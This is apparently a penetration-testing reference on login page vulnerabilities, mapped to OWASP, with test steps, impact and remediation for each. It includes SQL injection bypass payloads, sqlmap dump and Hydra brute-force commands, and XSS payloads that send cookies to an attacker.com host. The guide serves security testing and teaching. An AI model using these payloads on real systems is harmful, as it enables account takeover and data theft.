# Login Page Vulnerabilities — Complete Penetration Testing Reference

> A detailed manual penetration testing guide covering all major login page vulnerabilities, how to identify them, why they matter, their real-world impact, and their mapping to the OWASP Top 10 2025.

---

## Table of Contents

| # | Vulnerability | OWASP Mapping |
|---|--------------|---------------|
| 1 | [Application Running on HTTP Protocol](#1-application-running-on-http-protocol) | A02:2025 — Cryptographic Failures |
| 2 | [Username Enumeration](#2-username-enumeration) | A01:2025 — Broken Access Control |
| 3 | [Password Brute Force](#3-password-brute-force) | A07:2025 — Identification and Authentication Failures |
| 4 | [SQL Injection on Login](#4-sql-injection-on-login) | A03:2025 — Injection |
| 5 | [Authorization Bypass and Response Manipulation](#5-authorization-bypass-and-response-manipulation) | A01:2025 — Broken Access Control |
| 6 | [Session Does Not Expire After Logout](#6-session-does-not-expire-after-logout) | A07:2025 — Identification and Authentication Failures |
| 7 | [Long Session Persistence](#7-long-session-persistence) | A07:2025 — Identification and Authentication Failures |
| 8 | [Cross-Site Scripting (XSS) — All Types](#8-cross-site-scripting-xss--all-types) | A03:2025 — Injection |
| 9 | [SQL Injection — All Types](#9-sql-injection--all-types) | A03:2025 — Injection |
| 10 | [IDOR — All Types](#10-insecure-direct-object-reference-idor--all-types) | A01:2025 — Broken Access Control |
| 11 | [Clickjacking](#11-clickjacking) | A05:2025 — Security Misconfiguration |
| 12 | [Missing Security Headers](#12-missing-security-headers) | A05:2025 — Security Misconfiguration |
| 13 | [Weak Password Policy](#13-weak-password-policy) | A07:2025 — Identification and Authentication Failures |
| 14 | [Directory Listing and Path Traversal](#14-directory-listing-and-path-traversal) | A01:2025 — Broken Access Control |
| 15 | [Sensitive Information Leakage](#15-sensitive-information-leakage-in-source-code-and-response-headers) | A02:2025 — Cryptographic Failures |
| 16 | [Improper Error Handling and Debug Mode](#16-improper-error-handling-and-debug-mode-enabled) | A05:2025 — Security Misconfiguration |
| 17 | [No Authentication on Sensitive Endpoints](#17-no-authentication-on-sensitive-endpoints) | A07:2025 — Identification and Authentication Failures |

---

## 1. Application Running on HTTP Protocol

### OWASP Mapping
**A02:2025 — Cryptographic Failures**
CWE-319: Cleartext Transmission of Sensitive Information

---

### What It Is

HTTP (HyperText Transfer Protocol) transmits all data in **plain text** — meaning every request, including login credentials, session tokens, and personal data, is sent across the network without any encryption. HTTPS (HTTP + TLS/SSL) encrypts this data so it cannot be read in transit.

When a login page is served over HTTP, every username and password typed by a user travels across the network in a format that any person on the same network can intercept and read directly.

---

### Why It Is a Vulnerability

The core problem is the complete absence of confidentiality in data transmission. Any attacker who can position themselves between the user and the server — a position called Man-in-the-Middle (MITM) — can read all traffic without the user ever knowing. This requires no exploitation of any code flaw; the data is simply not encrypted.

Additionally, modern browsers actively warn users when a login form is served over HTTP, and search engines penalise HTTP sites. Most importantly, it violates security best practices and regulatory frameworks like GDPR, PCI-DSS, and HIPAA which mandate encryption of data in transit.

---

### How to Check

**Step 1 — Observe the URL bar**

```
http://target.com/login    ← VULNERABLE (plain HTTP)
https://target.com/login   ← Encrypted (HTTPS)
```

**Step 2 — Intercept traffic with Wireshark or tcpdump**

On the same network, start packet capture and submit a login:

```bash
# Capture HTTP traffic on the network interface
sudo wireshark

# OR using tcpdump
sudo tcpdump -i eth0 -A port 80 | grep -i "username\|password\|POST"
```

If you can read the credentials in plaintext in the captured packets, the vulnerability is confirmed.

**Step 3 — Use Burp Suite as a proxy**

```
1. Configure Burp as a proxy (127.0.0.1:8080)
2. Submit the login form
3. In Burp HTTP History, inspect the request:

POST http://target.com/login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=Password123
```

The fact that both username and password are visible in plaintext in Burp confirms the traffic is unencrypted.

**Step 4 — Check for mixed content**

Even if the login page loads over HTTPS, form submission may go to an HTTP endpoint:

```html
<!-- Check the form action attribute in page source -->
<form action="http://target.com/process_login" method="POST">
  <!-- Credentials submitted over HTTP despite HTTPS page load -->
</form>
```

**Step 5 — Use online tools**

```
- SSL Labs: https://www.ssllabs.com/ssltest/
- Security Headers: https://securityheaders.com
- Check for HSTS header: Strict-Transport-Security
```

---

### Real-World Attack Scenario

```
Scenario: Coffee Shop Attack

1. Victim connects to a coffee shop Wi-Fi network
2. Attacker is on the same network and starts Wireshark
3. Victim opens http://targetbank.com/login and enters credentials
4. Attacker sees in Wireshark:

   POST /login HTTP/1.1
   Host: targetbank.com

   username=john.doe@gmail.com&password=MySecurePass2024

5. Attacker now has valid credentials — no hacking needed
```

---

### Impact

| Impact Area | Description |
|-------------|-------------|
| Credential theft | All usernames and passwords intercepted in plaintext |
| Session hijacking | Session cookies stolen, attacker impersonates user |
| Data interception | Any sensitive data submitted through the app is exposed |
| MITM attacks | Attacker can modify requests and responses in transit |
| Regulatory violation | Violates GDPR, PCI-DSS, and HIPAA encryption requirements |

**CIA Triad Impact:**
- Confidentiality: **HIGH** — all data exposed in transit
- Integrity: **HIGH** — data can be modified in transit
- Availability: **LOW** — service continues to function

**CVSS Score: ~7.5 HIGH**
`CVSS:3.1/AV:A/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N`

---

### Remediation

- Enforce HTTPS across the entire application
- Implement HSTS (HTTP Strict Transport Security) header: `Strict-Transport-Security: max-age=31536000; includeSubDomains; preload`
- Redirect all HTTP requests to HTTPS: `301 Moved Permanently`
- Use a valid TLS certificate (minimum TLS 1.2, prefer TLS 1.3)
- Disable support for SSLv2, SSLv3, TLS 1.0, TLS 1.1

---

---

## 2. Username Enumeration

### OWASP Mapping
**A01:2025 — Broken Access Control** / **A07:2025 — Identification and Authentication Failures**
CWE-204: Observable Response Discrepancy

---

### What It Is

Username enumeration is a vulnerability where an application reveals whether a username or email address exists in the system based on different responses to login attempts. An attacker can use this to build a list of valid usernames, which then significantly reduces the effort required for brute force attacks.

---

### Why It Is a Vulnerability

Exposing whether a username exists is information disclosure. An attacker who knows a valid username has already completed half the work needed to compromise an account. With a valid username confirmed, they can:

- Target that specific account for brute force
- Craft personalised phishing emails addressing the user by their registered email
- Combine with password spray attacks
- Check if a corporate email exists in the system before attacking

The vulnerability arises because developers naturally write different error messages for different failure scenarios, which makes sense for usability but is a security risk.

---

### How to Check

**Method 1 — Compare error messages on the login page**

Submit these two combinations and compare the responses carefully:

```
Test 1 — Valid username, wrong password:
  Username: admin          (known or guessed to exist)
  Password: WrongPass123

Test 2 — Invalid username, wrong password:
  Username: userXYZXYZ999  (definitely does not exist)
  Password: WrongPass123
```

Vulnerable responses:

```
Test 1 response: "Invalid password. Please try again."
Test 2 response: "Username not found."

↑ Different messages = username enumeration confirmed
```

Secure response (no enumeration):

```
Both responses: "Invalid username or password."
```

**Method 2 — Check HTTP response size differences in Burp Suite**

Even if the error message text is the same, the page may differ slightly in:
- Response body length (even by 1 byte)
- Response time (valid users may trigger a database lookup that takes longer)
- HTTP status code (200 vs 302 redirect)
- Different HTML hidden fields or tokens in the response

```
1. Open Burp Suite → Proxy → Intercept ON
2. Submit login with valid username → send to Repeater
3. Submit login with invalid username → send to Repeater
4. Compare:
   - Response length (bottom right in Burp)
   - Response body content
   - HTTP status codes
   - Timing differences
```

**Method 3 — Password reset function**

The password reset page is often even more revealing:

```
Vulnerable:
  Enter email: admin@target.com
  Response: "We have sent a reset link to admin@target.com"   ← confirms user exists

  Enter email: fake@fake999.com
  Response: "Email address not found in our system"           ← confirms user doesn't exist

Secure:
  Both: "If your email exists in our system, you will receive a reset link."
```

**Method 4 — Registration page**

```
Register with: admin@target.com
Response: "This email is already registered. Please log in."  ← confirms user exists
```

**Method 5 — Automated enumeration with ffuf or Burp Intruder**

```bash
# Using a wordlist of common usernames to enumerate valid ones
ffuf -w /usr/share/wordlists/usernames.txt \
     -X POST \
     -d "username=FUZZ&password=wrongpass" \
     -u http://target.com/login \
     -fs 1234   # filter by response size — different size = valid user
```

---

### Real-World Attack Scenario

```
Scenario: Corporate Employee Enumeration

1. Attacker visits http://target-company.com/login
2. Tests: username=john.smith@company.com → "Invalid password"
3. Tests: username=fakexyz@company.com    → "User not found"
4. Attacker now knows john.smith exists
5. Uses LinkedIn to find more employee names
6. Enumerates 50 valid corporate email addresses
7. Launches targeted phishing or credential stuffing campaign
```

---

### Impact

| Impact Area | Description |
|-------------|-------------|
| Account targeting | Attacker can confirm which accounts exist before attacking |
| Reduced brute force time | Half the work (username) already done |
| Phishing enablement | Valid emails used for targeted phishing |
| Privacy violation | Reveals whether someone is a user of the application |
| Credential stuffing | Valid usernames combined with breach password lists |

**CIA Triad Impact:**
- Confidentiality: **MEDIUM** — reveals user existence
- Integrity: **LOW** — no data modified
- Availability: **LOW** — no disruption

**CVSS Score: ~5.3 MEDIUM**
`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`

---

### Remediation

- Return identical error messages for both invalid username and invalid password: `"Invalid username or password"`
- Ensure response size and timing are identical for both scenarios
- Implement the same response on the password reset page
- Rate-limit login and password reset requests
- Log enumeration attempts for detection

---

---

## 3. Password Brute Force

### OWASP Mapping
**A07:2025 — Identification and Authentication Failures**
CWE-307: Improper Restriction of Excessive Authentication Attempts

---

### What It Is

Password brute forcing is the automated process of systematically trying large numbers of username and password combinations against a login form until the correct one is found. When no protection mechanisms (rate limiting, account lockout, CAPTCHA) exist, an attacker can try thousands or millions of passwords per minute.

---

### Why It Is a Vulnerability

Without rate limiting or lockout policies, a login endpoint becomes a free-to-use password testing service. Common users choose weak passwords from predictable patterns (`Password1`, `company2024`, `qwerty123`). Given enough attempts, any account is eventually compromised.

Three types of brute force exist:

- **Pure brute force** — tries all character combinations (very slow but thorough)
- **Dictionary attack** — tries words from a wordlist (common passwords, names, dates)
- **Credential stuffing** — tries username:password pairs leaked in previous breaches

---

### How to Check

**Step 1 — Identify if rate limiting exists**

Manually submit 5-10 wrong passwords rapidly:

```
Attempt 1: admin / wrongpass1  → Response: "Invalid credentials"
Attempt 2: admin / wrongpass2  → Response: "Invalid credentials"
...
Attempt 10: admin / wrongpass10 → Response: "Invalid credentials"
```

If no lockout, CAPTCHA, or slowdown occurs, the endpoint is vulnerable.

**Step 2 — Use Burp Suite Intruder**

```
1. Submit login request → send to Intruder
2. Set attack type: Sniper
3. Mark the password field as the payload position:
   username=admin&password=§wrongpass§

4. Load payload list: /usr/share/wordlists/rockyou.txt
5. Start attack
6. Sort by response length — a different length = successful login
7. Or sort by status code — 302 redirect = login success
```

**Step 3 — Use Hydra (command line)**

```bash
# HTTP POST form brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  http-post-form \
  "target.com/login:username=^USER^&password=^PASS^:Invalid username or password" \
  -V -t 20

# If you have a username list
hydra -L usernames.txt -P passwords.txt \
  http-post-form \
  "target.com/login:username=^USER^&password=^PASS^:Invalid" \
  -V
```

**Step 4 — Check for account lockout**

After X failed attempts:
- Is the account locked?
- Is there a CAPTCHA challenge?
- Is there a time delay before next attempt?
- Does the IP get blocked?

```bash
# Test lockout threshold
for i in {1..20}; do
  curl -s -X POST http://target.com/login \
    -d "username=admin&password=wrongpass$i" | grep -i "locked\|captcha\|blocked"
done
```

**Step 5 — Test for password spray (avoiding lockouts)**

Instead of many passwords for one account, try one common password across many accounts:

```
Attempt 1: john.smith  / Password2024!   → Invalid
Attempt 2: jane.doe    / Password2024!   → Invalid
Attempt 3: mike.jones  / Password2024!   → SUCCESS
```

This bypasses per-account lockout policies.

---

### Real-World Attack Scenario

```
Scenario: No Rate Limiting on Admin Login

1. Attacker confirms admin account exists via username enumeration
2. Loads rockyou.txt (14 million common passwords)
3. Runs Hydra:
   hydra -l admin -P rockyou.txt http-post-form "/login:u=^USER^&p=^PASS^:Invalid"

4. After 47,291 attempts (~2 minutes at 500 req/s):
   [80][http-post-form] host: target.com   login: admin   password: admin2023

5. Attacker logs in with admin / admin2023 → full admin access
```

---

### Impact

| Impact Area | Description |
|-------------|-------------|
| Account takeover | Any account can be compromised given enough time |
| Admin compromise | If admin accounts have weak passwords, full system access |
| Data breach | Attacker accesses all data of compromised accounts |
| Denial of Service | High-volume brute force can slow or crash the login service |
| Regulatory impact | Account compromise triggers breach notification obligations |

**CIA Triad Impact:**
- Confidentiality: **HIGH** — full account access gained
- Integrity: **HIGH** — attacker can modify account data
- Availability: **MEDIUM** — volume attacks can degrade service

**CVSS Score: ~9.8 CRITICAL** (when no protections at all)
`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`

---

### Remediation

- Implement account lockout after 5-10 failed attempts (with unlock via email)
- Add progressive delays: 1s after 3 failures, 5s after 5, 30s after 10
- Implement CAPTCHA after 3-5 failed attempts
- Rate-limit by IP (e.g., max 10 attempts per minute per IP)
- Implement Multi-Factor Authentication (MFA)
- Detect and alert on unusual login patterns (many failures, unusual geography)
- Force strong password policies (see vulnerability #13)

---

---

## 4. SQL Injection on Login

### OWASP Mapping
**A03:2025 — Injection**
CWE-89: Improper Neutralization of Special Elements used in an SQL Command

---

### What It Is

SQL Injection on a login page occurs when user-supplied input (username and/or password) is directly concatenated into an SQL query without sanitization. An attacker can inject SQL syntax that changes the logic of the query, bypassing authentication entirely — without knowing any valid password.

---

### Why It Is a Vulnerability

The root cause is treating user input as trusted code rather than as data. When a developer writes:

```sql
"SELECT * FROM users WHERE username='" + userInput + "' AND password='" + passInput + "'"
```

They have created a query where user input changes the SQL structure itself. This is fundamentally unsafe because SQL is a programming language — giving users control over query structure gives them control over the database.

---

### How to Check

**Step 1 — Inject a single quote to trigger an error**

Enter in the username field:

```
'
```

Vulnerable responses:
```
MySQL error: You have an error in your SQL syntax near '' at line 1
SQL error: Unclosed quotation mark after the character string ''
Generic 500 Internal Server Error (error hidden but SQL error occurred)
```

No error = likely parameterised queries (but keep testing).

**Step 2 — Authentication bypass payloads**

Try these in the username field (password can be anything):

```sql
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'#
' OR 1=1--
admin'--
admin'#
' OR 'x'='x
') OR ('1'='1
' OR 1=1-- -
```

Full username field example:
```
Username: admin'--
Password: anything

Resulting query:
SELECT * FROM users WHERE username='admin'--' AND password='anything'
                                             ↑ Comments out password check
```

**Step 3 — Test in Burp Suite Repeater**

```
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin'--&password=anything
```

If response redirects to dashboard or shows a logged-in state, SQLi confirmed.

**Step 4 — Use sqlmap for automated detection**

```bash
# Basic login form test
sqlmap -u "http://target.com/login" \
       --data="username=admin&password=test" \
       --level=5 --risk=3 \
       --dbms=mysql \
       -p username

# Dump all databases after confirming injection
sqlmap -u "http://target.com/login" \
       --data="username=admin&password=test" \
       --dbs --dump
```

**Step 5 — Test the password field too**

```sql
Username: admin
Password: anything' OR '1'='1
```

---

### Real-World Attack Scenario

```
Scenario: Admin Login Bypass

Application query (vulnerable):
SELECT * FROM users WHERE username='INPUT' AND password='INPUT' AND role='admin'

Attacker inputs:
Username: ' OR '1'='1' AND role='admin'--
Password: irrelevant

Resulting query:
SELECT * FROM users WHERE username='' OR '1'='1' AND role='admin'--' AND password='irrelevant'

Since '1'='1' is always true and role='admin' is checked,
the query returns the first admin user in the database.

Result: Attacker is logged in as administrator with no credentials.
```

---

### Impact

| Impact Area | Description |
|-------------|-------------|
| Authentication bypass | Login completely bypassed without valid credentials |
| Full database dump | All user data, hashed passwords, PII extracted |
| Data destruction | DROP TABLE, DELETE can wipe entire databases |
| Remote code execution | Via xp_cmdshell (MSSQL) or UDF (MySQL) |
| Privilege escalation | Access admin accounts without knowing their passwords |

**CIA Triad Impact:**
- Confidentiality: **HIGH** — full database access
- Integrity: **HIGH** — data can be modified or deleted
- Availability: **HIGH** — tables can be dropped

**CVSS Score: ~9.8 CRITICAL**
`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`

---

### Remediation

- Use **parameterised queries / prepared statements** — the only true fix:
  ```python
  # SECURE — parameterised
  cursor.execute("SELECT * FROM users WHERE username=? AND password=?", (username, password))
  ```
- Use an ORM (SQLAlchemy, Hibernate, Eloquent) which handles parameterisation automatically
- Validate and whitelist input — reject inputs containing SQL characters where not expected
- Apply principle of least privilege — DB user should have only SELECT on required tables
- Enable WAF (Web Application Firewall) as a secondary control, not a replacement

---

---

## 5. Authorization Bypass and Response Manipulation

### OWASP Mapping
**A01:2025 — Broken Access Control**
CWE-285: Improper Authorization | CWE-639: Authorization Bypass Through User-Controlled Key

---

### What It Is

Authorization bypass is when an attacker can gain access to areas or functionality they should not have access to — without exploiting a code injection flaw. Response manipulation is a specific technique where the attacker intercepts the application's response and modifies it to trick the client into thinking authentication or authorization was successful.

---

### Why It Is a Vulnerability

Many applications make authorization decisions on the **client side** or in a way that is visible and modifiable in the HTTP response. If the server returns a JSON response like `{"authenticated": false}` and the client uses this value to decide whether to redirect to the dashboard, an attacker can simply change it to `{"authenticated": true}` before the browser processes it.

The fundamental flaw is trusting the client-side state or modifiable response data instead of enforcing authorization server-side on every request.

---

### How to Check

**Method 1 — Response Manipulation with Burp Suite**

```
Step 1: Submit login with wrong credentials
Step 2: In Burp, go to Proxy → Intercept → turn on "Intercept responses"
Step 3: Resubmit the login
Step 4: Intercept the server response

Server response (before manipulation):
HTTP/1.1 200 OK
{"status": "failed", "authenticated": false, "redirect": "/login"}

Step 5: In Burp, modify the response:
{"status": "success", "authenticated": true, "redirect": "/dashboard"}

Step 6: Forward the modified response
Step 7: If the application redirects to /dashboard → VULNERABLE
```

**Method 2 — Status Code Manipulation**

```
Server response: HTTP/1.1 401 Unauthorized

Modify to: HTTP/1.1 200 OK

If the application processes the 200 as successful auth → VULNERABLE
```

**Method 3 — Cookie/Parameter Manipulation**

```
After failed login, response sets:
Set-Cookie: isAdmin=false; role=user

Manually modify cookie in browser:
isAdmin=true; role=admin

Then access /admin — if accessible → VULNERABLE
```

**Method 4 — Direct URL Access After Failed Login**

```
Login fails at: http://target.com/login
Try directly accessing: http://target.com/dashboard
                        http://target.com/admin
                        http://target.com/profile
```

If these load without authentication → authorization bypass confirmed.

**Method 5 — JavaScript-based auth bypass**

Look in page source for client-side authorization logic:

```javascript
// Vulnerable pattern in page source
if (response.data.loggedIn === true) {
    window.location.href = '/dashboard';
}
// An attacker can intercept and modify response.data.loggedIn to true
```

---

### Real-World Attack Scenario

```
Scenario: Response Manipulation Login Bypass

1. Attacker submits login with random credentials
2. Burp intercepts the server's response:
   {"error": "Invalid credentials", "logged_in": false, "user_id": null}

3. Attacker changes it to:
   {"error": null, "logged_in": true, "user_id": 1}

4. Client-side JavaScript reads logged_in: true → redirects to /dashboard
5. All subsequent API calls go to /api/user/1/data → server serves data
   because session was set server-side on first request to /dashboard
   (many apps set session on visit even before verifying)

6. Attacker now has access to the application without valid credentials
```

---

### Impact

| Impact Area | Description |
|-------------|-------------|
| Authentication bypass | Access application without valid credentials |
| Privilege escalation | Access admin functionality as a regular user |
| Horizontal access | Access other users' data by manipulating user IDs |
| Full account takeover | If session is established after bypass |
| Business logic bypass | Skip payment steps, approval workflows |

**CIA Triad Impact:**
- Confidentiality: **HIGH** — access to unauthorised data
- Integrity: **HIGH** — perform unauthorised actions
- Availability: **LOW** — service continues normally

**CVSS Score: ~9.1 CRITICAL**
`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`

---

### Remediation

- **Never make authorization decisions based on client-supplied data**
- Enforce authorization server-side on every single request
- Validate session tokens on every request before serving any protected content
- Return identical error responses for failed auth (do not include auth flags in responses)
- Implement proper session management — check session state server-side, not via cookies alone
- Use framework-provided auth middleware that rejects unauthorized requests before any logic runs

---

---

## 6. Session Does Not Expire After Logout

### OWASP Mapping
**A07:2025 — Identification and Authentication Failures**
CWE-613: Insufficient Session Expiration

---

### What It Is

When a user logs out, the application should immediately invalidate the session token on the server side so that the old token can no longer be used. If the server does not invalidate the session token upon logout, an attacker who captures that token (via XSS, network sniffing, or shoulder surfing) can continue using it to access the account even after the legitimate user has logged out.

---

### Why It Is a Vulnerability

Logout is a security action — the user is explicitly stating they no longer want their session to be active. If the application only deletes the cookie on the client side without invalidating the token on the server, the token itself still works. An attacker with a copy of that token can simply replay it in their own browser to access the account as the original user indefinitely.

---

### How to Check

**Step 1 — Capture the session token before logout**

```
1. Log in to the application
2. Open Burp Suite → Proxy → HTTP History
3. Find the Set-Cookie header in the login response:
   Set-Cookie: PHPSESSID=abc123xyz789; Path=/; HttpOnly

4. Note down the session token: abc123xyz789
```

**Step 2 — Log out of the application**

```
Click the "Logout" button or visit /logout
Browser should redirect to /login page
```

**Step 3 — Replay the old session token**

Using Burp Repeater, send a request to a protected endpoint with the old token:

```
GET /dashboard HTTP/1.1
Host: target.com
Cookie: PHPSESSID=abc123xyz789   ← The OLD token used before logout

If response is 200 OK and shows the dashboard → session NOT invalidated → VULNERABLE
If response is 302 redirect to /login → session properly invalidated → SECURE
```

**Step 4 — Test with browser developer tools**

```
1. Log in → Copy session cookie from DevTools → Application → Cookies
2. Log out
3. Open a new private/incognito window
4. Manually set the cookie: PHPSESSID=abc123xyz789
5. Navigate to http://target.com/dashboard
6. If logged in → VULNERABLE
```

**Step 5 — Test with curl**

```bash
# Test protected endpoint with old session
curl -b "PHPSESSID=abc123xyz789" http://target.com/dashboard -L -v

# If HTML of dashboard is returned → session still valid after logout
# If redirected to /login → session properly invalidated
```

---

### Real-World Attack Scenario

```
Scenario: Shared Computer or XSS Cookie Theft

1. User logs into their banking app on a shared office computer
2. XSS payload stolen their session cookie earlier:
   Session token: SESSID=AbCdEf123456

3. User clicks "Logout" — browser cookie is deleted, user sees login page
4. Attacker (who captured the token) visits the bank app and sets:
   Cookie: SESSID=AbCdEf123456

5. Application checks server — session still valid (server never invalidated it)
6. Attacker is now inside the victim's account even after victim logged out
7. Attacker transfers funds, changes password, accesses statements
```

---

### Impact

| Impact Area | Description |
|-------------|-------------|
| Account takeover | Old session token works indefinitely after logout |
| Persistent access | Attacker maintains access even after victim logs out |
| Shared device risk | High risk in public/office computers |
| XSS amplification | Stolen tokens remain useful forever |
| Compliance violation | PCI-DSS, HIPAA require proper session termination |

**CIA Triad Impact:**
- Confidentiality: **HIGH** — ongoing account access
- Integrity: **HIGH** — attacker can perform actions on victim's behalf
- Availability: **LOW** — no disruption to service

**CVSS Score: ~7.5 HIGH**
`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N`

---

### Remediation

- Invalidate session tokens **server-side** immediately upon logout — not just client-side cookie deletion
- Maintain a server-side list of active sessions; remove entry on logout
- Set session cookie with `Secure`, `HttpOnly`, and `SameSite=Strict` attributes
- Implement absolute session timeout (e.g., 8 hours maximum regardless of activity)
- Implement idle session timeout (e.g., 15-30 minutes of inactivity)

---

---

## 7. Long Session Persistence

### OWASP Mapping
**A07:2025 — Identification and Authentication Failures**
CWE-613: Insufficient Session Expiration

---

### What It Is

Long session persistence refers to session tokens that remain valid for an excessively long period — days, weeks, or even permanently. While some "remember me" functionality is expected and acceptable, session tokens that never expire or have very long lifetimes dramatically extend the window of opportunity for attackers who obtain those tokens.

---

### Why It Is a Vulnerability

Session tokens are credentials. Just as a password that never changes is riskier than one that is rotated regularly, a session token that is valid for 30 days means an attacker who steals it has 30 days of access. In high-security applications like banking or healthcare, sessions should be very short-lived. The longer a token is valid, the more valuable it is to an attacker.

---

### How to Check

**Step 1 — Check session cookie expiry in browser**

```
Browser DevTools → Application → Cookies → target.com

Look for the Expires/Max-Age column:
  Name: SESSID
  Value: abc123
  Expires: Session         ← Expires when browser closes (better)
  Expires: 2025-12-31      ← 1 year expiry (VULNERABLE — too long)
  Max-Age: 2592000         ← 30 days (may be too long depending on app type)
```

**Step 2 — Check the Set-Cookie response header in Burp**

```
HTTP/1.1 200 OK
Set-Cookie: SESSID=abc123; Max-Age=2592000; Path=/; Secure; HttpOnly
                            ↑ 30 days — evaluate if appropriate for this app
```

**Step 3 — Test actual session lifetime**

```
1. Log in and note the session token
2. Wait 30+ minutes without any activity
3. Try to access a protected page
4. If still logged in → no idle timeout → VULNERABLE

5. Note exact token and wait 24+ hours
6. Try replaying the token
7. If still valid → excessive persistence → VULNERABLE
```

**Step 4 — Check "Remember Me" implementation**

```
1. Log in with "Remember Me" checked
2. Close browser completely
3. Reopen browser and visit the application
4. If logged in → "Remember Me" is implemented
5. Check how long the persistent token lasts:
   - 7 days = borderline acceptable
   - 30+ days = excessive for most apps
   - Permanent = VULNERABLE
```

**Step 5 — Check if idle sessions are terminated**

```bash
# Script to test idle timeout
# Record session token, wait, then replay
TOKEN="abc123"
sleep 1800   # Wait 30 minutes

curl -b "SESSID=$TOKEN" http://target.com/api/profile
# If 200 OK → no idle timeout implemented
# If 401/302 → idle timeout working correctly
```

---

### Real-World Attack Scenario

```
Scenario: Long-lived Token via XSS on Banking App

1. Banking app sets: SESSID=xyz; Max-Age=2592000 (30 days)
2. Attacker finds stored XSS vulnerability in transaction notes field
3. Payload: <script>fetch('https://attacker.com/?c='+document.cookie)</script>
4. Victim visits transaction history → token sent to attacker

5. Attacker stores token: xyz (valid for 30 more days)
6. Even if victim changes password → session token still valid
7. Attacker accesses banking app with stolen token for the next 30 days
8. Only defence: victim must explicitly log out every single time
```

---

### Impact

| Impact Area | Description |
|-------------|-------------|
| Extended attack window | More time for attacker to use stolen tokens |
| "Remember Me" abuse | Persistent cookies give long-term access |
| No rotation | Session token never refreshed, increasing theft risk |
| Password change bypass | Old tokens often still valid even after password change |

**CIA Triad Impact:**
- Confidentiality: **HIGH** — prolonged unauthorized access
- Integrity: **MEDIUM** — depends on what actions attacker takes
- Availability: **LOW** — no disruption

**CVSS Score: ~6.5 MEDIUM**
`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N`

---

### Remediation

- Set appropriate session lifetimes based on application risk (banking: 15 min idle; e-commerce: 1 hour)
- Implement idle session timeout (terminate after inactivity)
- Implement absolute session timeout (maximum session duration regardless of activity)
- Regenerate session token on login, privilege change, and password change
- Invalidate all existing sessions when a user changes their password
- For "Remember Me": use a separate, rotating "remember me" token — not the session token itself

---

---

## 8. Cross-Site Scripting (XSS) — All Types

### OWASP Mapping
**A03:2025 — Injection**
CWE-79: Improper Neutralization of Input During Web Page Generation

---

### What It Is

Cross-Site Scripting (XSS) is a vulnerability where an attacker injects malicious JavaScript into a web page that is then executed in the victim's browser. The injected script runs in the context of the victim's session, meaning it has access to their cookies, can make requests on their behalf, and can modify the page they see.

There are three types of XSS, each with different persistence and delivery mechanisms.

---

### Why It Is a Vulnerability

JavaScript code runs with the full trust of the origin it is served from. A script running on `bank.com` can access all cookies for `bank.com`, make authenticated API calls, read form fields, and redirect the page. When an attacker injects script into a page, their malicious code inherits all these permissions. The browser has no way to distinguish legitimate site scripts from attacker-injected scripts.

---

### Types of XSS

---

#### Type 1 — Reflected XSS (Non-Persistent)

The malicious script is part of the HTTP request (usually in a URL parameter) and is immediately reflected back in the HTTP response. It is not stored anywhere. The victim must click a specially crafted link.

**How to Check:**

Identify input that is reflected in the page output, then inject a payload:

```
Vulnerable URL: http://target.com/search?q=hello
Page shows: "You searched for: hello"

Test injection:
http://target.com/search?q=<script>alert(1)</script>

If page shows an alert popup → Reflected XSS confirmed
```

Test payloads for different encoding contexts:

```html
<!-- Basic test -->
<script>alert(document.domain)</script>

<!-- If inside HTML attribute: value="INPUT" -->
" onmouseover="alert(1)
"><script>alert(1)</script>

<!-- If inside JavaScript: var x = 'INPUT' -->
'; alert(1)//

<!-- If HTML-encoded — try bypasses -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src="javascript:alert(1)">
```

**Attack Scenario:**
```
1. Attacker finds: http://target.com/login?error=<script>alert(document.cookie)</script>
2. Crafts malicious link and sends via phishing email
3. Victim clicks link
4. Browser executes script — cookie sent to attacker
5. Attacker uses cookie to hijack session
```

---

#### Type 2 — Stored XSS (Persistent)

The malicious script is stored in the application's database (e.g., in a comment, profile field, message, or address) and served to every user who views that content. This is the most dangerous type because it does not require the victim to click any special link.

**How to Check:**

Find any input that is stored and displayed to other users:

```
Test locations on login/registration pages:
- Username field (displayed in profile)
- First/Last name fields
- Address fields
- Bio or description fields
- Any "message to admin" fields

Inject into these fields:
<script>alert(document.cookie)</script>
<img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)">
```

**Verification:**

```
1. Register/update profile with payload in the "Full Name" field:
   Name: John <script>document.location='http://attacker.com/?c='+document.cookie</script>

2. Log out and log in as a different user (or admin)
3. View the profile/user list that shows the name
4. If the script executes (cookie sent to attacker server) → Stored XSS confirmed
```

**Attack Scenario:**
```
1. Attacker registers with name: <script>fetch('//attacker.com?c='+document.cookie)</script>
2. This is stored in the database
3. Admin views the user list
4. Admin's browser executes the script
5. Admin's session cookie sent to attacker
6. Attacker now has admin session
```

---

#### Type 3 — DOM-Based XSS

The vulnerability exists entirely in client-side JavaScript. The server sends a safe page, but client-side JS reads a user-controllable value (URL hash, URL parameter) and writes it to the DOM without sanitization. No server-side interaction is needed.

**How to Check:**

Look for JavaScript that reads from URL fragments or parameters and writes to the DOM:

```javascript
// Vulnerable code in page source
var name = location.hash.substring(1);
document.getElementById('welcome').innerHTML = name;
// OR
document.write(location.search);
// OR
var data = new URLSearchParams(location.search).get('q');
elem.innerHTML = data;
```

Test by crafting URLs:

```
http://target.com/page#<img src=x onerror=alert(1)>
http://target.com/page?q=<script>alert(1)</script>
```

**Common DOM sources (attacker-controlled inputs):**
- `document.URL`
- `document.location`
- `location.href`
- `location.search`
- `location.hash`
- `document.referrer`

**Common DOM sinks (dangerous functions that execute input):**
- `innerHTML`
- `document.write()`
- `eval()`
- `setTimeout()` with string argument
- `jQuery.html()`

---

### Comprehensive XSS Testing Checklist

```
Input fields to test on login pages:
[ ] Username field
